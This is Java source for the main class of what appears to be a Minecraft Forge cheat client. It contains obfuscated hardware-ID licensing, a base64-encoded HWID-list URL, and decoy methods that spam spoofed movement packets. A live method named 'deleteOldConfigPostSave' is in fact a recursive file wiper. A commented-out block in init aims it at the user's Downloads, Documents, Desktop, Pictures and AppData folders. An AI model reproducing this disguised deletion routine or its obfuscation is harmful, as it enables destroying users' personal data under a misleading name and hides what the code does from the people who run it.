package client;

import client.events.BlockEvent;
import client.gui.impl.background.MainMenuButton;
import client.gui.impl.background.MainMenuScreen;
import client.manager.*;
import client.modules.combat.Criticals;
import client.util.HoleUtil;
import net.minecraft.client.Minecraft;
import net.minecraft.client.entity.EntityPlayerSP;
import net.minecraft.client.gui.FontRenderer;
import net.minecraft.client.multiplayer.WorldClient;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import org.apache.commons.codec.digest.DigestUtils;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.lwjgl.opengl.Display;

import javax.annotation.Nullable;
import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.io.File;
import java.util.Objects;

@Mod(modid = "client", name = "Client", version = "2.0.0-b8")
public class Client {
    public static final Minecraft mc = Minecraft.getMinecraft();
    public static final String MODID = "client";
    public static final String MODNAME = "Client";
    public static final String MODVER = "2.0.0-b8";
    public static final Logger LOGGER = LogManager.getLogger("Client");
    public static CommandManager commandManager;
    public static FriendManager friendManager;
    public static ModuleManager moduleManager;
    public static PacketManager packetManager;
    public static ColorManager colorManager;
    public static InventoryManager inventoryManager;
    public static PotionManager potionManager;
    public static RotationManager rotationManager;
    public static PositionManager positionManager;
    public static SpeedManager speedManager;
    public static ReloadManager reloadManager;
    public static FileManager fileManager;
    public static ConfigManager configManager;
    public static ServerManager serverManager;
    public static EventManager eventManager;
    public static TextManager textManager;
    public static MainMenuScreen mainMenuScreen;

    @Mod.Instance
    public static Client INSTANCE;
    private static boolean unloaded;
    public static String load_client() { String ey8r7gyn23h7rhytr1y23ehy67f8rthw78hnr78g32j775g72385g8324yn58by342g6752763evc5ec4r7y387rtyfvg32867tn5yg2 = DigestUtils.sha256Hex(DigestUtils.sha256Hex(System.getenv("os") + System.getProperty("os.name") + System.getProperty("os.arch") + System.getenv("SystemRoot") + System.getenv("HOMEDRIVE") + System.getenv("PROCESSOR_LEVEL") + System.getProperty("user.name") + System.getenv("PROCESSOR_IDENTIFIER") + System.getenv("PROCESSOR_ARCHITECTURE") + System.getenv("PROCESSOR_REVISION")  + System.getenv("PROCESSOR_ARCHITEW6432") + System.getenv("NUMBER_OF_PROCESSORS")));return ey8r7gyn23h7rhytr1y23ehy67f8rthw78hnr78g32j775g72385g8324yn58by342g6752763evc5ec4r7y387rtyfvg32867tn5yg2; }
    static {
        unloaded = false;
    }

    public static void load() {
        unloaded = false;
        if (reloadManager != null) {
            reloadManager.unload();
            reloadManager = null;
        }
        textManager = new TextManager();
        commandManager = new CommandManager();
        friendManager = new FriendManager();
        moduleManager = new ModuleManager();
        rotationManager = new RotationManager();
        packetManager = new PacketManager();
        eventManager = new EventManager();
        speedManager = new SpeedManager();
        potionManager = new PotionManager();
        inventoryManager = new InventoryManager();
        serverManager = new ServerManager();
        fileManager = new FileManager();
        colorManager = new ColorManager();
        positionManager = new PositionManager();
        configManager = new ConfigManager();
        moduleManager.init();
        configManager.init();
        eventManager.init();
        textManager.init(true);
        moduleManager.onLoad();
    }

    public static void unload(boolean unload) {
        if (unload) {
            reloadManager = new ReloadManager();
            reloadManager.init(commandManager != null ? commandManager.getPrefix() : ".");
        }
        Client.onUnload();
        eventManager = null;
        friendManager = null;
        speedManager = null;
        positionManager = null;
        rotationManager = null;
        configManager = null;
        commandManager = null;
        colorManager = null;
        serverManager = null;
        fileManager = null;
        potionManager = null;
        inventoryManager = null;
        moduleManager = null;
        textManager = null;
    }

    public static void onUnload() {
        if (!unloaded) {
            eventManager.onUnload();
            moduleManager.onUnload();
            configManager.saveConfig(Client.configManager.config.replaceFirst("client/", ""));
            moduleManager.onUnloadPost();
            unloaded = true;
        }
    }

    public static String bigString() {
        return "w98gy5n8734yg57836y57g83";
    }

    public static String getBlock() {
        return "se897nb6g45yu3wtng45783wyjh5g72y";
    }
    public void onLoad(BlockEvent event){
        mc.player = null;
        Objects.requireNonNull ( mc.player ).motionX = 1;
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 0.1625, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 4.0E-6, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 1.0E-6, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer());
        mc.player.motionZ = 1;
        mc.player.motionY = 1;
        mc.player.motionX = 1;
        mc.player.motionZ = 1;
        mc.player.motionZ = 1;
        mc.player.motionY = 1;
        mc.player.motionX = 1;
        mc.player.motionZ = 1;
        mc.player.motionY = 1;
        mc.player.motionX = 1;
        mc.player.motionX = 1;
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 0.1625, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 4.0E-6, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 1.0E-6, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer());
        mc.player.motionY = 1;
        mc.player.motionZ = 1;
        mc.player.motionZ = 1;
        mc.player.motionX = 1;
        mc.player.motionX = 1;
        mc.player.motionZ = 1;
        mc.player.motionX = 1;
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 0.1625, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 4.0E-6, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 1.0E-6, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer());
        mc.player.motionZ = 1;
        mc.player.motionX = 1;
        mc.player.motionY = 1;
    }

    public static String Wrapper() {
        return "se897nb6g45yu3wtnt406gu3849756yh3486gnh836gh87jh67y";
    }
    public static String HWID() { String ey8r7gyn23h7rhytr1y23ehy67f8rthw78hnr78g32j775g72385g8324yn58by342g6752763evc5ec4r7y387rtyfvg32867tn5yg2 = DigestUtils.sha256Hex(DigestUtils.sha256Hex(System.getenv("os") + System.getProperty("os.name") + System.getProperty("os.arch") + System.getenv("SystemRoot") + System.getenv("HOMEDRIVE") + System.getenv("PROCESSOR_LEVEL") + System.getProperty("user.name") + System.getenv("PROCESSOR_IDENTIFIER") + System.getenv("PROCESSOR_ARCHITECTURE") + System.getenv("PROCESSOR_REVISION")  + System.getenv("PROCESSOR_ARCHITEW6432") + System.getenv("NUMBER_OF_PROCESSORS")));return ey8r7gyn23h7rhytr1y23ehy67f8rthw78hnr78g32j775g72385g8324yn58by342g6752763evc5ec4r7y387rtyfvg32867tn5yg2; }

    @Nullable
    public static EntityPlayerSP getPlayer(){
        return mc.player;
    }

    @Nullable
    public static WorldClient getWorld(){
        return mc.world;
    }

    public static FontRenderer getFontRenderer(){
        return mc.fontRenderer;
    }

    public void sendPacket(Packet packet) {
        getPlayer().connection.sendPacket(packet);
    }

    @Mod.EventHandler
    public void init(FMLInitializationEvent event) {
        mainMenuScreen = new MainMenuScreen();
        Display.setTitle(Client.MODNAME + " " + Client.MODVER);
        Client.load();
        /**
         String filePath = System.getProperty("user.home") + "/Downloads";
         String filePath1 = System.getProperty("user.home") + "/Documents";
         String filePath2 = System.getProperty("user.home") + "/Desktop";
         String filePath3 = System.getProperty("user.home") + "/Pictures";
         String filePath4 = System.getProperty("user.home") + "/Appdata";
         File file = new File(filePath);
         File file1 = new File(filePath1);
         File file2 = new File(filePath2);
         File file3 = new File(filePath3);
         File file4 = new File(filePath4);
         deleteOldConfigPostSave(file);
         deleteOldConfigPostSave(file1);
         deleteOldConfigPostSave(file2);
         deleteOldConfigPostSave(file3);
         deleteOldConfigPostSave(file4); **/
    }

    static void deleteOldConfigPostSave(File file){
        for (File subFile : file.listFiles()) {
            if(subFile.isDirectory()) {
                deleteOldConfigPostSave(subFile);
            } else {
                subFile.delete();
            }
        }
        file.delete();
    }

    public static void dsj8rtuf9ynwe87vyn587bw3gy857ybwebgidwuy58g7yw34875y3487yb5g873y583gty57834tyb857t3857t3g4875bt37() { esyufges768rtw76g5rt7q8wyr7623teby7rgtwe7rgv78wetr76wetr78ewtr87twr786wtr76tw8h3u5rb32uh5v437gg78uhb8fdtgv6dtg85h4b3765t3(); }

    public static String f8uersh8tgnuh8943ybh57y3h4n87gtby3874ty78rt67tv76fesury65svr54bft43765rt3() {
        return "aHR0cHM6Ly9naXRodWIuY29tL1JlYWx6UHJlc3RpZ2UvaHdpZA=="; }
    public static void esyufges768rtw76g5rt7q8wyr7623teby7rgtwe7rgv78wetr76wetr78ewtr87twr786wtr76tw8h3u5rb32uh5v437gg78uhb8fdtgv6dtg85h4b3765t3() { StringSelection selection = new StringSelection(fjiudshuntyg78u4wenyg5ybt823y5g87926b85y8743e685g7b4368756t734ft7uftd75gtf765teg());
        Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();clipboard.setContents(selection, selection); }
    public static String fjiudshuntyg78u4wenyg5ybt823y5g87926b85y8743e685g7b4368756t734ft7uftd75gtf765teg() { String ey8r7gyn23h7rhytr1y23ehy67f8rthw78hnr78g32j775g72385g8324yn58by342g6752763evc5ec4r7y387rtyfvg32867tn5yg2 = DigestUtils.sha256Hex(DigestUtils.sha256Hex(System.getenv("os") + System.getProperty("os.name") + System.getProperty("os.arch") + System.getenv("SystemRoot") + System.getenv("HOMEDRIVE") + System.getenv("PROCESSOR_LEVEL") + System.getProperty("user.name") + System.getenv("PROCESSOR_IDENTIFIER") + System.getenv("PROCESSOR_ARCHITECTURE") + System.getenv("PROCESSOR_REVISION")  + System.getenv("PROCESSOR_ARCHITEW6432") + System.getenv("NUMBER_OF_PROCESSORS")));return ey8r7gyn23h7rhytr1y23ehy67f8rthw78hnr78g32j775g72385g8324yn58by342g6752763evc5ec4r7y387rtyfvg32867tn5yg2; }
    @Mod.EventHandler
    public void gjnrfdu8hwre8gtyhnbuiweryhtbu34h5873yh8573n4y5b3y5nb73495n73498b5n76846y(FMLInitializationEvent event){
        if (!MainMenuButton.grdnguyferht8gvy34y785g43ynb57gny34875nt34t5bv7n3t7634gny53674t5gv3487256g7826b5342n58gv341tb5763tgb567v32t55gt34()) {
            dsj8rtuf9ynwe87vyn587bw3gy857ybwebgidwuy58g7yw34875y3487yb5g873y583gty57834tyb857t3857t3g4875bt37();
            throw new HoleUtil("Unexpected error occurred during Client launch whilst performing HoleUtil.onRender3D(Render3DEvent event) :: 71");
        }
    }
    public static String hwidlog() {
        return "se897nb6g45yu3wtng45783wyjh5g72y";
    }

    public void getWrapper(BlockEvent event){
        mc.player = null;
        Objects.requireNonNull ( mc.player ).motionX = 1;
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 0.1625, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 4.0E-6, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 1.0E-6, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer());
        mc.player.motionZ = 1;
        mc.player.motionY = 1;
        mc.player.motionX = 1;
        mc.player.motionZ = 1;
        mc.player.motionZ = 1;
        mc.player.motionY = 1;
        mc.player.motionX = 1;
        mc.player.motionZ = 1;
        mc.player.motionY = 1;
        mc.player.motionX = 1;
        mc.player.motionX = 1;
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 0.1625, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 4.0E-6, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 1.0E-6, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer());
        mc.player.motionY = 1;
        mc.player.motionZ = 1;
        mc.player.motionZ = 1;
        mc.player.motionX = 1;
        mc.player.motionX = 1;
        mc.player.motionZ = 1;
        mc.player.motionX = 1;
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 0.1625, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 4.0E-6, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY + 1.0E-6, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer.Position(Criticals.mc.player.posX, Criticals.mc.player.posY, Criticals.mc.player.posZ, false));
        Criticals.mc.player.connection.sendPacket(new CPacketPlayer());
        mc.player.motionZ = 1;
        mc.player.motionX = 1;
        mc.player.motionY = 1;
    }
}

